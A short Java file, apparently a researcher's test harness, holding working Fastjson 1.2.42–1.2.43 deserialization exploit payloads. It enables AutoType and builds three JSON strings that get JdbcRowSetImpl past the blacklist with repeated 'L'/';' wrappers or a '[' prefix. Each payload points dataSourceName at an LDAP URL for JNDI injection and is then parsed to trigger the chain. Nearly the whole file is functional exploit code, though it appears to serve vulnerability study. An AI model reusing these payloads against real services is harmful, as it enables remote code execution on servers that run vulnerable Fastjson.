package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/5/7
 * Description 1.2.42-1.2.43
 */
public class fastjsonTest1 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:8888/pbbLLAew\",\"AutoCommit\":\"true\"}";
        String s1 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://127.0.0.1:8888/pbbLLAew\",\"AutoCommit\":\"true\"}]}";
        // 多个L ;
        String s2 = "{\"@type\":\"LLLLcom.sun.rowset.JdbcRowSetImpl;;;;\",\"dataSourceName\":\"ldap://127.0.0.1:8888/pbbLLAew\",\"AutoCommit\":\"true\"}";
//        Object parse = JSON.parseObject(s1, Feature.SupportNonPublicField);
        JSON.parseObject(s1);
    }
}
